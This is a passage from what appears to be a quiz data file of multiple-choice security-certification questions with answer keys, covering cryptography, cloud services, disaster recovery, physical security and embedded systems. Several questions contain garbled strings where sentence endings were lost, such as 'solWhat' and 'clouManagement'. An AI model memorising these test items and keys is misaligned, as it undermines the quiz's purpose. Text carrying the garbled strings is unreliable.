        "What cryptographic capability ensures that even if the server's private key is compromised, the session keys will not be compromised?",
      incorrectAnswers: [
        "Symmetric encryption",
        "Quantum key rotation",
        "Diffie-Hellman key modulation",
      ],
      correctAnswer: "Perfect forward secrecy",
    },
    {
      question:
        "Alaina is reviewing practices for her reception desk and wants to ensure that the reception desk's visitor log is accurate. What process should she add to the guard's check-in procedure?",
      incorrectAnswers: [
        "Perform a biometric scan to validate visitor identities.",
        "Require two-person integrity control.",
        "Replace the guard with a security robot.",
      ],
      correctAnswer: "Check the visitor's ID against their log book entry.",
    },
    {
      question:
        "In an attempt to observe hacker techniques, a security administrator configures a nonproduction network to be used as a target so that he can covertly monitor network attacks. What is this type of network called?",
      incorrectAnswers: ["Active detection", "False subnet", "IDS"],
      correctAnswer: "Honeynet",
    },
    {
      question:
        "What type of system is used to control and monitor power plant power generation systems?",
      incorrectAnswers: ["IPG", "SEED", "ICD"],
      correctAnswer: "SCADA",
    },
    {
      question:
        "What major technical component of modern cryptographic systems is likely to be susceptible to quantum attacks?",
      incorrectAnswers: [
        "Key generation",
        "Elliptical plot algorithms",
        "Cubic root curve cryptography",
      ],
      correctAnswer: "Prime factorization algorithms",
    },
    {
      question:
        "Geoff wants to establish a contract with a company to have datacenter space that is equipped and ready to go so that he can bring his data to the location in the event of a disaster. What type of disaster recovery site is he looking for?",
      incorrectAnswers: ["A hot site", "A cold site", "An RTO site"],
      correctAnswer: "A warm site",
    },
    {
      question:
        "Olivia needs to ensure an IoT device does not have its operating system modified by third parties after it is solWhat solution should she implement to ensure that this does not occur?",
      incorrectAnswers: [
        "Set a default password.",
        "Check the MD5sum for new firmware versions.",
        "Patch regularly.",
      ],
      correctAnswer: "Require signed and encrypted firmware.",
    },
    {
      question:
        "What statement is expected to be true for a post-quantum cryptography world?",
      incorrectAnswers: [
        "Encryption speed will be measured in qubits.",
        "Quantum encryption will no longer be relevant.",
        "Key lengths longer than 4,096 bits using RSA will be required.",
      ],
      correctAnswer: "Nonquantum cryptosystems will no longer be secure.",
    },
    {
      question:
        "What function does counter mode perform in a cryptographic system?",
      incorrectAnswers: [
        "It reverses the encryption process.",
        "It turns a stream cipher into a block cipher.",
        "It allows public keys to unlock private keys.",
      ],
      correctAnswer: "It turns a block cipher into a stream cipher.",
    },
    {
      question:
        "Which of the following items is not included in a blockchain's public ledger?",
      incorrectAnswers: [
        "A record of all genuine transactions between network participants",
        "A record of cryptocurrency balances (or other data) stored in the blockchain",
        "The identity of the blockchain participants",
      ],
      correctAnswer:
        "A token that identifies the authority under which the transaction was made",
    },
    {
      question:
        "Suzan is responsible for application development in her company. She wants to have all web applications tested before they are deployed live. She wants to use a test system that is identical to the live server. What is this called?",
      incorrectAnswers: [
        "A production server",
        "A development server",
        "A predeployment server",
      ],
      correctAnswer: "A test server",
    },
    {
      question:
        "Alexandra is preparing to run automated security tests against the code that developers in her organization have completeWhich environment is she most likely to run them in if the next step is to deploy the code to production?",
      incorrectAnswers: ["Development", "Test", "Production"],
      correctAnswer: "Staging",
    },
    {
      question:
        "Chris wants to limit who can use an API that his company provides and be able to log usage of the API uniquely to each organization that they provide access to. What solution is most often used to do this?",
      incorrectAnswers: [
        "Firewalls with rules for each company's public IP address",
        "User credentials for each company",
        "API passwords",
      ],
      correctAnswer: "API keys",
    },
    {
      question:
        "Derek has been assigned to assess the security of smart meters. Which of the following is not a common concern for an embedded system like a smart meter?",
      incorrectAnswers: [
        "Eavesdropping",
        "Denial of service",
        "Remote disconnection",
      ],
      correctAnswer: "SQL injection",
    },
    {
      question:
        "Selah wants to analyze real-world attack patterns against systems similar to what she already has deployed in her organization. She would like to see local commands on a compromised system and have access to any tools or other materials the attackers would normally deploy. What type of technology could she use to do this?",
      incorrectAnswers: ["An IPS", "An IDS", "A WAF"],
      correctAnswer: "A honeypot",
    },
    {
      question:
        "Charles sets up a network with intentional vulnerabilities and then instruments it so that he can watch attackers and capture details of their attacks and techniques. What has Charles set up?",
      incorrectAnswers: ["A black hole", "A honeyhole", "A spynet"],
      correctAnswer: "A honeynet",
    },
    {
      question:
        "Maria is a security engineer with a manufacturing company. During a recent investigation, she discovered that an engineer's compromised workstation was being used to connect to SCADA systems while the engineer was not logged in. The engineer is responsible for administering the SCADA systems and cannot be blocked from connecting to them. What should Maria do to mitigate this threat?",
      incorrectAnswers: [
        "Install host-based antivirus software on the engineer's system.",
        "Implement an NIPS on the SCADA system.",
        "Use FDE on the engineer's system.",
      ],
      correctAnswer: "Implement account usage auditing on the SCADA system.",
    },
    {
      question: "AES and DES are an example of what type of cipher?",
      incorrectAnswers: [
        "Stream ciphers that encrypt groups of plain-text symbols all together",
        "Stream ciphers that encrypt one plain-text symbol at a time",
        "Block ciphers that encrypt one plain-text symbol at a time",
      ],
      correctAnswer:
        "Block ciphers that encrypt groups of plain-text symbols all together",
    },
    {
      question:
        "Gerard is responsible for secure communications with his company's e-commerce server. All communications with the server use TLS. What is the most secure option for Gerard to store the private key on the e-commerce server?",
      incorrectAnswers: ["FDE", "SED", "SDN"],
      correctAnswer: "HSM",
    },
    {
      question: "What purpose does a transit gateway serve in cloud services?",
      incorrectAnswers: [
        "It connects systems inside of a cloud datacenter.",
        "It provides an API gateway between trust zones.",
        "It allows multicloud infrastructure designs.",
      ],
      correctAnswer:
        "It connects virtual private clouds and on-premises networks.",
    },
    {
      question:
        "Web developers in your company currently have direct access to the production server and can deploy code directly to it. This can lead to unsecure code, or simply code flaws being deployed to the live system. What would be the best change you could make to mitigate this risk?",
      incorrectAnswers: [
        "Implement sandboxing.",
        "Implement virtualized servers.",
        "Implement deployment policies.",
      ],
      correctAnswer: "Implement a staging server.",
    },
    {
      question:
        "Ian is concerned about VoIP phones used in his organization due to the use of SMS as part of their multifactor authentication rollout. What type attack should he be concerned about?",
      incorrectAnswers: [
        "A vishing attack",
        "A voicemail hijack",
        "A weak multifactor code injection",
      ],
      correctAnswer: "An SMS token redirect",
    },
    {
      question:
        "Angela wants to ensure that IoT devices in her organization have a secure configuration when they are deployed and that they are ready for further configuration for their specific purposes. What term is used to describe these standard configurations used as part of her configuration management program?",
      incorrectAnswers: [
        "An essential settings list",
        "A preinstall checklist",
        "A setup guide",
      ],
      correctAnswer: "A baseline configuration",
    },
    {
      question:
        "Why is heating, ventilation, and air-conditioning (HVAC) part of organizational security planning?",
      incorrectAnswers: [
        "Attackers often use HVAC systems as part of social engineering exercises.",
        "HVAC systems are a primary line of network defense.",
        "None of the above",
      ],
      correctAnswer: "HVAC systems are important for availability.",
    },
    {
      question:
        "What advantage does symmetric encryption have over asymmetric encryption?",
      incorrectAnswers: [
        "It is more secure.",
        "It can use longer keys.",
        "It simplifies key distributions.",
      ],
      correctAnswer: "It is faster.",
    },
    {
      question:
        "Laura knows that predictability is a problem in pseudo-random number generators (PRNGs) used for encryption operations. What term describes the measure of uncertainty used to a PRNG?",
      incorrectAnswers: ["Ellipses", "Quantum flux", "Primeness"],
      correctAnswer: "Entropy",
    },
    {
      question:
        "Which cloud service model gives the consumer the ability to use applications provided by the cloud provider over the Internet?",
      incorrectAnswers: ["PaaS", "IaaS", "Hybrid"],
      correctAnswer: "SaaS",
    },
    {
      question:
        "Chris sets a resource policy in his cloud environment. What type of control does this allow him to exert?",
      incorrectAnswers: [
        "It allows him to determine how much disk space can be used.",
        "It allows him to determine how much bandwidth can be used.",
        "It allows him to specify what actions a resource can take on specific users.",
      ],
      correctAnswer:
        "It allows him to specify who has access to resources and what actions they can perform on it.",
    },
    {
      question:
        "Chris sets up SAN replication for his organization. What has he done?",
      incorrectAnswers: [
        "He has enabled RAID 1 to ensure that the SAN cannot lose data if a drive fails because the drives are replicated.",
        "He has set up backups to a tape library for the SAN to ensure data resilience.",
        "He has built a second identical set of hardware for his SAN.",
      ],
      correctAnswer:
        "He has replicated the data on one SAN to another at the block or hardware level.",
    },
    {
      question:
        "Mike is a security analyst and has just removed malware from a virtual server. What feature of virtualization would he use to return the virtual server to a last known good state?",
      incorrectAnswers: ["Sandboxing", "Hypervisor", "Elasticity"],
      correctAnswer: "Snapshot",
    },
    {
      question:
        "Lisa is concerned about fault tolerance for her database server. She wants to ensure that if any single drive fails, it can be recovereWhat RAID level would support this goal while using distributed parity bits?",
      incorrectAnswers: ["RAID", "RAID 1", "RAID 3"],
      correctAnswer: "RAID 5",
    },
    {
      question:
        "Jarod is concerned about EMI affecting a key escrow server. Which method would be most effective in mitigating this risk?",
      incorrectAnswers: ["VLAN", "SDN", "Trusted platform module"],
      correctAnswer: "Faraday cage",
    },
    {
      question:
        "John is responsible for physical security at his company. He is particularly concerned about an attacker driving a vehicle into the building. Which of the following would provide the best protection against this threat?",
      incorrectAnswers: [
        "A gate",
        "A security guard on duty",
        "Security cameras",
      ],
      correctAnswer: "Bollards",
    },
    {
      question:
        "Mark is responsible for cybersecurity at a small college. There are many computer labs that are open for students to use. These labs are monitored only by a student worker, who may or may not be very attentive. Mark is concerned about the theft of computers. Which of the following would be the best way for him to mitigate this threat?",
      incorrectAnswers: [
        "FDE on the lab computers",
        "Strong passwords on the lab computers",
        "Having a lab sign-in sheet",
      ],
      correctAnswer: "Cable locks",
    },
    {
      question:
        "Joanne is responsible for security at a power plant. The facility is very sensitive and security is extremely important. She wants to incorporate two-factor authentication with physical security. What would be the best way to accomplish this?",
      incorrectAnswers: [
        "Smartcards",
        "A mantrap with video surveillance",
        "A fence with a smartcard gate access",
      ],
      correctAnswer:
        "A mantrap with a smartcard at one door and a PIN keypad at the other door",
    },
    {
      question:
        "Which of the following terms refers to the process of establishing a standard for security?",
      incorrectAnswers: ["Security evaluation", "Hardening", "Normalization"],
      correctAnswer: "Baselining",
    },
    {
      question:
        "Angela configures a honeypot to ongoing events like user logins and logouts, disk usage, program and script loads, and similar information. What is this type of deception called?",
      incorrectAnswers: ["User emulation", "Honeyfakes", "Deepfakes"],
      correctAnswer: "Fake telemetry",
    },
    {
      question: 'Which level of RAID is a "stripe of mirrors"?',
      incorrectAnswers: ["RAID 6", "RAID", "RAID 1"],
      correctAnswer: "RAID 1+0",
    },
    {
      question:
        "Isabella is responsible for database management and security. She is attempting to remove redundancy in the database. What is this process called?",
      incorrectAnswers: ["Integrity checking", "Deprovisioning", "Baselining"],
      correctAnswer: "Normalization",
    },
    {
      question:
        "Gary wants to implement an AAA service. Which of the following services should he implement?",
      incorrectAnswers: ["OpenID", "LDAP", "SAML"],
      correctAnswer: "RADIUS",
    },
    {
      question: "Where does TLS/SSL inspection happen, and how does it occur?",
      incorrectAnswers: [
        "On the client, using a proxy",
        "On the server, using a protocol analyzer",
        "At the certificate authority, by validating a request for a TLS certificate",
      ],
      correctAnswer:
        "Between the client and server by intercepting encrypted communications",
    },
    {
      question:
        "Diana wants to prevent drones from flying over her organization's property. What can she do?",
      incorrectAnswers: [
        "Deploy automated drone take-down systems that will shoot the drones down.",
        "Deploy radio frequency jamming systems to disrupt the drone's control frequencies.",
        "Contact the FAA to get her company's property listed as a no-fly zone.",
      ],
      correctAnswer: "None of the above",
    },
    {
      question:
        "Isaac has configured an infrastructure-as-code-based cloud environment that relies on codedefined system builds to spin up new systems as the services they run need to scale horizontally. An attacker discovers a vulnerability and exploits a system in the cluster, but it is shut down and terminated before they can perform a forensic analysis. What term describes this type of environment?",
      incorrectAnswers: [
        "Forensic-resistant",
        "Live-boot",
        "Terminate and stay resident",
      ],
      correctAnswer: "Nonpersistent",
    },
    {
      question:
        "You are responsible for database security at your company. You are concerned that programmers might pass badly written SQL commands to the database, or that an attacker might exploit badly written SQL in applications. What is the best way to mitigate this threat?",
      incorrectAnswers: [
        "Formal code inspection",
        "Programming policies",
        "Agile programming",
      ],
      correctAnswer: "Stored procedures",
    },
    {
      question:
        "Joanna's company has adopted multiple software-as-a-service (SaaS) tools and now wants to better coordinate them so that the data that they each contain can be used in multiple services. What type of solution should she recommend if she wants to minimize the complexity of long-term maintenance for her organization?",
      incorrectAnswers: [
        "Replace the SaaS service with a platform-as-a-service (PaaS) environment to move everything to a single platform.",
        "Build API-based integrations using in-house expertise.",
        "Build flat-file integrations using in-house expertise.",
      ],
      correctAnswer: "Adopt an integration platform to leverage scalability.",
    },
    {
      question:
        "Fares is responsible for managing the many virtual machines on his company's networks. Over the past two years, the company has increased the number of virtual machines significantly. Fares is no longer able to effectively manage the large number of machines. What is the term for this situation?",
      incorrectAnswers: ["VM overload", "VM spread", "VM zombies"],
      correctAnswer: "VM sprawl",
    },
    {
      question:
        "Mary is responsible for virtualization management in her company. She is concerned about VM escape. Which of the following methods would be the most effective in mitigating this risk?",
      incorrectAnswers: [
        "Keep the VM patched.",
        "Use a firewall on the VM.",
        "Use host-based antimalware on the VM.",
      ],
      correctAnswer:
        "Only share resources between the VM and host if absolutely necessary.",
    },
    {
      question:
        "Irene wants to use a cloud service for her organization that does not require her to do any coding or system administration, and she wants to do minimal configuration to perform the tasks that her organization needs to accomplish. What type of cloud service is she most likely looking for?",
      incorrectAnswers: ["PaaS", "IaaS", "IDaaS"],
      correctAnswer: "SaaS",
    },
    {
      question:
        "Which of the following is not an advantage of a serverless architecture?",
      incorrectAnswers: [
        "It does not require a system administrator.",
        "It can scale as function call frequency increases.",
        "It can scale as function call frequency decreases.",
      ],
      correctAnswer: "It is ideal for complex applications.",
    },
    {
      question:
        "You are responsible for server room security for your company. You are concerned about physical theft of the computers. Which of the following would be best able to detect theft or attempted theft?",
      incorrectAnswers: [
        "Smartcard access to the server rooms",
        "Strong deadbolt locks for the server rooms",
        "Logging everyone who enters the server room",
      ],
      correctAnswer: "Motion sensor-activated cameras",
    },
    {
      question:
        "Alexandra wants to prevent systems that are infected with malware from connecting to a botnet controller that she knows the hostnames for. What type of solution can she implement to prevent the systems from reaching the controller?",
      incorrectAnswers: ["An IDS", "A round-robin DNS", "A WAF"],
      correctAnswer: "A DNS sinkhole",
    },
    {
      question:
        "Hector is using infrared cameras to verify that servers in his datacenter are being properly rackeWhich of the following datacenter elements is he concerned about?",
      incorrectAnswers: ["EMI blocking", "Humidity control", "UPS failover"],
      correctAnswer: "Hot and cold aisles",
    },
    {
      question:
        "Gerald is concerned about unauthorized people entering the company's building. Which of the following would be most effective in preventing this?",
      incorrectAnswers: ["Alarm systems", "Fencing", "Cameras"],
      correctAnswer: "Security guards",
    },
    {
      question:
        "Which of the following is the most important benefit from implementing SDN?",
      incorrectAnswers: [
        "It will stop malware.",
        "It will detect intrusions.",
        "It will prevent session hijacking.",
      ],
      correctAnswer: "It provides scalability.",
    },
    {
      question:
        "Mark is an administrator for a health care company. He has to support an older, legacy application. He is concerned that this legacy application might have vulnerabilities that would affect the rest of the network. What is the most efficient way to mitigate this?",
      incorrectAnswers: [
        "Implement SDN.",
        "Run the application on a separate VLAN.",
        "Insist on an updated version of the application.",
      ],
      correctAnswer: "Use an application container.",
    },
    {
      question:
        "Charles is performing a security review of an internally developed web application. During his review, he notes that the developers who wrote the application have made use of thirdparty libraries. What risks should he note as part of his review?",
      incorrectAnswers: [
        "Code compiled with vulnerable third-party libraries will need to be recompiled with patched libraries.",
        "Libraries used via code repositories could become unavailable, breaking the application.",
        "Malicious code could be added without the developers knowing it.",
      ],
      correctAnswer: "All of the above",
    },
    {
      question:
        "Valerie is considering deploying a cloud access security broker. What sort of tool is she looking at?",
      incorrectAnswers: [
        "A system that implements mandatory access control on cloud infrastructure",
        "A tool that sits between cloud application providers and customers to enforce web application security policies",
        "A system that implements discretionary access control on cloud infrastructure",
      ],
      correctAnswer:
        "A tool that sits between cloud users and applications to monitor activity and enforce policies",
    },
    {
      question:
        "Derek has been asked to implement his organization's service-oriented architecture as a set of microservices. What does he need to implement?",
      incorrectAnswers: [
        "A set of services that run on very small systems",
        "A set of tightly coupled services with custom-designed protocols to ensure continuous operation",
        "A set of services using third-party applications in a connected network enabled with industry standard protocols",
      ],
      correctAnswer: "A set of loosely coupled services with specific purposes",
    },
    {
      question:
        "Abigail is responsible for datacenters in a large, multinational company. She has to support multiple datacenters in diverse geographic regions. What would be the most effective way for her to manage these centers consistently across the enterprise?",
      incorrectAnswers: [
        "Hire datacenter managers for each center.",
        "Implement enterprise-wide SDN.",
        "Automate provisioning and deprovisioning.",
      ],
      correctAnswer: "Implement infrastructure as code (IaC).",
    },
    {
      question:
        "Elizabeth wants to implement a cloud-based authorization system. Which of the following protocols is she most likely to use for that purpose?",
      incorrectAnswers: ["OpenID", "Kerberos", "SAML"],
      correctAnswer: "OAuth",
    },
    {
      question:
        "Greg is assessing an organization and finds that they have numerous multifunction printers (MFPs) that are accessible from the public Internet. What is the most critical security issue he should identify?",
      incorrectAnswers: [
        "Third parties could print to the printers, using up the supplies.",
        "The printers could be used as part of a DDoS attack.",
        "The scanners may be accessed to allow attackers to scan documents that are left in them.",
      ],
      correctAnswer:
        "The printers may allow attackers to access other parts of the company network.",
    },
    {
      question:
        "Keith has deployed computers to users in his company that load their resources from a central server environment rather than from their own hard drives. What term describes this model?",
      incorrectAnswers: ["Thick clients", "Client-as-a-server", "Cloud desktops"],
      correctAnswer: "Thin clients",
    },
    {
      question:
        "Henry notices that a malware sample he is analyzing downloads a file from imgur.com and then executes an attack using Mimikatz, a powerful Windows password account theft tool. When he analyzes the image, he cannot identify any recognizable code. What technique has most likely been used in this scenario?",
      incorrectAnswers: [
        "The image is used as decryption key.",
        "The code is encoded as text in the image.",
        "The image is a control command from a malware command and control network.",
      ],
      correctAnswer: "The code is hidden in the image using steganography.",
    },
    {
      question:
        "Molly wants to advise her organization's developers on secure coding techniques to avoid data exposure. Which of the following is not a common technique used to prevent sensitive data exposure?",
      incorrectAnswers: [
        "Require HTTPs for all authenticated pages.",
        "Ensure tokens are not disclosed in public source code.",
        "Hash passwords using a salt.",
      ],
      correctAnswer: "Store data in plain text.",
    },
    {
      question:
        "Naomi wants to secure a real-time operating system (RTOS). Which of the following techniques is best suited to providing RTOS security?",
      incorrectAnswers: [
        "Disable the web browser.",
        "Install a host firewall.",
        "Install antimalware software.",
      ],
      correctAnswer: "Use secure firmware.",
    },
    {
      question:
        "John is examining the logs for his company's web applications. He discovers what he believes is a breach. After further investigation, it appears as if the attacker executed code from one of the libraries the application uses, code that is no longer even used by the application. What best describes this attack?",
      incorrectAnswers: ["Buffer overflow", "DoS attack", "Session hijacking"],
      correctAnswer: "Code reuse attack",
    },
    {
      question:
        "Chris is designing an embedded system that needs to provide low-power, peer-to-peer communications. Which of the following technologies is best suited to this purpose?",
      incorrectAnswers: ["Baseband radio", "Narrowband radio", "Cellular"],
      correctAnswer: "Zigbee",
    },
    {
      question:
        "What term is used to describe encryption that can permit computations to be conducted on ciphertext, with the results matching what would have occurred if the same computations were performed on the original plain text?",
      incorrectAnswers: [
        "Identity-preserving encryption",
        "Replicable encryption",
        "None of the above",
      ],
      correctAnswer: "Homomorphic encryption",
    },
    {
      question:
        "Tony wants to implement a biometric system for entry access in his organization. Which of the following systems is likely to be most accepted by members of his organization's staff?",
      incorrectAnswers: ["Retina", "Iris", "Voice"],
      correctAnswer: "Fingerprint",
    },
    {
      question:
        "Nathan wants to implement off-site cold backups. What backup technology is most commonly used for this type of need?",
      incorrectAnswers: ["SAN", "Disk", "NAS"],
      correctAnswer: "Tape",
    },
    {
      question:
        "Allan is considering implementing off-site storage. When he does, his datacenter manager offers four solutions. Which of these solutions will best ensure resilience and why?",
      incorrectAnswers: [
        "Back up to a second datacenter in another building nearby, allowing reduced latency for backups.",
        "Back up to a second datacenter in another building nearby to ensure that the data will be accessible if the power fails to the primary building.",
        "Back up to an off-site location at least 10 miles away to balance latency and resilience due to natural disaster.",
      ],
      correctAnswer:
        "Back up to an off-site location at least 90 miles away to ensure that a natural disaster does not destroy both copies.",
    },
    {
      question:
        "Ben has been asked to explain the security implications for an embedded system that his organization is considering building and selling. Which of the following is not a typical concern for embedded systems?",
      incorrectAnswers: [
        "Limited processor power",
        "An inability to patch",
        "Lack of authentication capabilities",
      ],
      correctAnswer: "Lack of bulk storage",
    },
    {
      question:
        "You are concerned about the security of new devices your company has implementeSome of these devices use SoC technology. What would be the best security measure you could take for these?",
      incorrectAnswers: ["Using a TPM", "Using SED", "Using BIOS protection"],
      correctAnswer: "Ensuring each has its own cryptographic key",
    },
    {
      question:
        "Vincent works for a company that manufactures portable medical devices, such as insulin pumps. He is concerned about ensuring these devices are secure. Which of the following is the most important step for him to take?",
      incorrectAnswers: [
        "Ensure the devices have FDE.",
        "Ensure the devices have individual antimalware.",
        "Ensure the devices have been fuzz-tested.",
      ],
      correctAnswer: "Ensure all communications with the device are encrypted.",
    },
    {
      question:
        "Emile is concerned about securing the computer systems in vehicles. Which of the following vehicle types has significant cybersecurity vulnerabilities?",
      incorrectAnswers: ["UAV", "Automobiles", "Airplanes"],
      correctAnswer: "All of the above",
    },
    {
      question:
        "What additional security control can Amanda implement if she uses compiled software that she cannot use if she only has software binaries?",
      incorrectAnswers: [
        "She can test the application in a live environment.",
        "She can check the checksums provided by the vendor.",
        "None of the above",
      ],
      correctAnswer: "She can review the source code.",
    },
    {
      question:
        "Greta wants to understand how a protocol works, including what values should be included in packets that use that protocol. Where is this data definitively defined and documented?",
      incorrectAnswers: [
        "Wikipedia",
        "The Internet Archive",
        "None of the above",
      ],
      correctAnswer: "An RFC",
    },
    {
      question:
        "Using standard naming conventions provides a number of advantages. Which of the following is not an advantage of using a naming convention?",
      incorrectAnswers: [
        "It can help administrators determine the function of a system.",
        "It can help administrators identify misconfigured or rogue systems.",
        "It can make scripting easier.",
      ],
      correctAnswer: "It can help conceal systems from attackers.",
    },
    {
      question:
        "Keith wants to identify a subject from camera footage from a train station. What biometric technology is best suited to this type of identification?",
      incorrectAnswers: [
        "Vein analysis",
        "Voiceprint analysis",
        "Fingerprint analysis",
      ],
      correctAnswer: "Gait analysis",
    },
    {
      question:
        "Your company is interested in keeping data in the clouManagement feels that public clouds are not secure but is concerned about the cost of a private clouWhat is the solution you would recommend?",
      incorrectAnswers: [
        "Tell them there are no risks with public clouds.",
        "Tell them they will have to find a way to budget for a private cloud.",
        "Recommend against a cloud solution at this time.",
      ],
      correctAnswer: "Suggest that they consider a community cloud.",
    },
    {
      question:
        "Your development team primarily uses Windows, but they need to develop a specific solution that will run on Linux. What is the best solution to get your programmers access to Linux systems for development and testing if you want to use a cloud solution where you could run the final systems in production as well?",
      incorrectAnswers: [
        "Set their machines to dual-boot Windows and Linux.",
        "Use PaaS.",
        "Set up a few Linux machines for them to work with as needed.",
      ],
      correctAnswer: "Use IaaS.",
    },
    {
      question:
        "Corrine has been asked to automate security responses, including blocking IP addresses from which attacks are detected using a series of scripts. What critical danger should she consider while building the scripts for her organization?",
      incorrectAnswers: [
        "The scripts may not respond promptly to private IP addresses.",
        "Attackers could use the scripts to attack the organization.",
        "Auditors may not allow the scripts.",
      ],
      correctAnswer: "The scripts could cause an outage.",
    },
    {
      question:
        "Madhuri has configured a backup that will back up all of the changes to a system since the last time that a full backup occurreWhat type of backup has she set up?",
      incorrectAnswers: ["A snapshot", "A full backup", "An incremental backup"],
      correctAnswer: "A differential",
    },
    {
      question:
        "You are the CIO for a small company. The company wants to use cloud storage for some of its data, but cost is a major concern. Which of the following cloud deployment models would be best?",
      incorrectAnswers: ["Community cloud", "Private cloud", "Hybrid cloud"],
      correctAnswer: "Public cloud",
    },
    {
      question:
        "What is the point where false acceptance rate and false rejection rate cross over in a biometric system?",
      incorrectAnswers: ["CRE", "FRE", "FRR"],
      correctAnswer: "CER",
    },
    {
      question:
        "Devin is building a cloud system and wants to ensure that it can adapt to changes in its workload by provisioning or deprovisioning resources automatically. His goal is to ensure that the environment is not overprovisioned or underprovisioned and that he is efficiently spending money on his infrastructure. What concept describes this?",
      incorrectAnswers: [
        "Vertical scalability",
        "Horizontal scalability",
        "Normalization",
      ],
      correctAnswer: "Elasticity",
    },
    {
      question:
        "Nathaniel wants to improve the fault tolerance of a server in his datacenter. If he wants to ensure that a power outage does not cause the server to lose power, what is the first control he should deploy from the following list?",
      incorrectAnswers: [
        "A generator",
        "Dual power supplies",
        "Managed power units (PDUs)",
      ],
      correctAnswer: "A UPS",
    },
    {
      question: "Which of the following is the best description for VM sprawl?",
      incorrectAnswers: [
        "When VMs on your network outnumber physical machines",
        "When a VM on a computer begins to consume too many resources",
        "When VMs are spread across a wide area network",
      ],
      correctAnswer: "When there are more VMs than IT can effectively manage",
    },
    {
      question:
        "Which of the following is the best description of a stored procedure?",
      incorrectAnswers: [
        "Code that is in a DLL, rather than the executable",
        "Server-side code that is called from a client",
        "Procedures that are kept on a separate server from the calling application, such as in middleware",
      ],
      correctAnswer:
        "SQL statements compiled on the database server as a single procedure that can be called",
    },
    {
      question:
        "Fares is responsible for security at his company. He has had bollards installed around the front of the building. What is Fares trying to accomplish?",
      incorrectAnswers: [
        "Gated access for people entering the building",
        "Video monitoring around the building",
        "Protecting against EMI",
      ],
      correctAnswer: "Preventing a vehicle from being driven into the building",
    },
    {
      question:
        "The large company that Selah works at uses badges with a magnetic stripe for entry access. Which threat model should Selah be concerned about with badges like these?",
      incorrectAnswers: [
        "Cloning of badges",
        "Tailgating",
        "Use by unauthorized individuals",
      ],
      correctAnswer: "All of the above",
    },
    {
      question:
        "You are concerned about VM escape attacks causing a significant data breach. Which of the following would provide the most protection against this?",
      incorrectAnswers: [
        "Install a host-based antivirus on both the VM and the host.",
        "Implement FDE on both the VM and the host.",
        "Use a TPM on the host.",
      ],
      correctAnswer: "Separate VM hosts by data type or sensitivity.",
    },
    {
      question:
        "Teresa is the network administrator for a small company. The company is interested in a robust and modern network defense strategy but lacks the staff to support it. What would be the best solution for Teresa to use?",
      incorrectAnswers: [
        "Implement SDN.",
        "Use automated security.",
        "Implement only the few security controls they have the skills to implement.",
      ],
      correctAnswer: "Use an MSSP.",
    },
    {
      question:
        "Dennis is trying to set up a system to analyze the integrity of applications on his network. He wants to make sure that the applications have not been tampered with or TrojaneWhat would be most useful in accomplishing this goal?",
      incorrectAnswers: [
        "Implement NIPS.",
        "Sandbox the applications in question.",
        "Implement NIDS.",
      ],
      correctAnswer: "Use cryptographic hashes.",
    },
    {
      question:
        "George is a network administrator at a power plant. He notices that several turbines had unusual ramp-ups in cycles last week. After investigating, he finds that an executable was uploaded to the system control console and caused this. Which of the following would be most effective in preventing this from affecting the SCADA system in the future?",
      incorrectAnswers: [
        "Implement SDN.",
        "Improve patch management.",
        "Implement encrypted data transmissions.",
      ],
      correctAnswer: "Place the SCADA system on a separate VLAN.",
    },
    {
      question:
        "Gordon knows that regression testing is important but wants to prevent old versions of code from being re-inserted into new releases. What process should he use to prevent this?",
      incorrectAnswers: [
        "Continuous integration",
        "Continuous deployment",
        "Release management",
      ],
      correctAnswer: "Version numbering",
    },
    {
      question:
        "Mia is a network administrator for a bank. She is responsible for secure communications with her company's customer website. Which of the following would be the best for her to implement?",
      incorrectAnswers: ["SSL", "PPTP", "IPSec"],
      correctAnswer: "TLS",
    },
    {
      question:
        "Which of the following is not a common challenge with smartcard-based authentication systems?",
      incorrectAnswers: [
        "Added expense due to card readers, distribution, and software installation",
        "Weaker user experience due to the requirement to insert the card for every authentication",
        "Lack of security due to possession of the card being the only factor used",
      ],
      correctAnswer:
        "Weak security due to the limitations of the smartcard's encryption support",
    },
    {
      question:
        "Susan's secure building is equipped with alarms that go off if specific doors are openeAs part of a penetration test, Susan wants to determine if the alarms are effective. What technique is used by penetration testers to make alarms less effective?",
      incorrectAnswers: [
        "Setting off the alarms as part of a preannounced test",
        "Disabling the alarms and then opening doors to see if staff report the opened doors",
        "Asking staff members to open the doors to see if they will set the alarm off",
      ],
      correctAnswer:
        "Setting off the alarms repeatedly so that staff become used to hearing them go off",
    },
    {
      question:
        'What term is used to describe the general concept of "anything as a service"?',
      incorrectAnswers: ["AaaS", "ATaaS", "ZaaS"],
      correctAnswer: "XaaS",
    },
    {
      question: "What role does signage play in building security?",
      incorrectAnswers: [
        "It is a preventive control warning unauthorized individuals away from secured areas.",
        "It can help with safety by warning about dangerous areas, materials, or equipment.",
        "It can provide directions for evacuation and general navigation.",
      ],
      correctAnswer: "All of the above",
    },
    {
      question:
        "Nora has rented a building with access to bandwidth and power in case her organization ever experiences a disaster. What type of site has she established?",
      incorrectAnswers: ["A hot site", "A warm site", "A MOU site"],
      correctAnswer: "A cold site",
    },
    {
      question:
        "Matt is patching a Windows system and wants to have the ability to revert to a last known good configuration. What should he set?",
      incorrectAnswers: [
        "A reversion marker",
        "A nonpersistent patch point",
        "A live boot marker",
      ],
      correctAnswer: "A system restore point",
    },
    {
      question:
        "Which multifactor authentication can suffer from problems if the system or device's time is not correct?",
      incorrectAnswers: ["SMS", "HOTP", "MMAC"],
      correctAnswer: "TOTP",
    },
    {
      question:
        "The company that Nina works for has suffered from recent thefts of packages from a lowsecurity delivery areWhat type of camera capability can they use to ensure that a recently delivered package is properly monitored?",
      incorrectAnswers: [
        "Infrared image capture",
        "Motion detection",
        "Facial recognition",
      ],
      correctAnswer: "Object detection",
    },
    {
      question:
        "Which of the following is not a common organizational security concern for wearable devices?",
      incorrectAnswers: [
        "GPS location data exposure",
        "Data exposure",
        "Insecure wireless connectivity",
      ],
      correctAnswer: "User health data exposure",
    },
    {
      question:
        "Tim is building a Faraday cage around his server room. What is the primary purpose of a Faraday cage?",
      incorrectAnswers: [
        "To regulate temperature",
        "To regulate current",
        "To block intrusions",
      ],
      correctAnswer: "To block EMI",
    },
    {
      question:
        "You are working for a large company. You are trying to find a solution that will provide controlled physical access to the building and record every employee who enters the building. Which of the following would be the best for you to implement?",
      incorrectAnswers: [
        "A security guard with a sign-in sheet",
        "A camera by the entrance",
        "A sign-in sheet by the front door",
      ],
      correctAnswer: "Smartcard access using electronic locks",
    },
    {
      question:
        "What concern causes organizations to choose physical locks over electronic locks?",
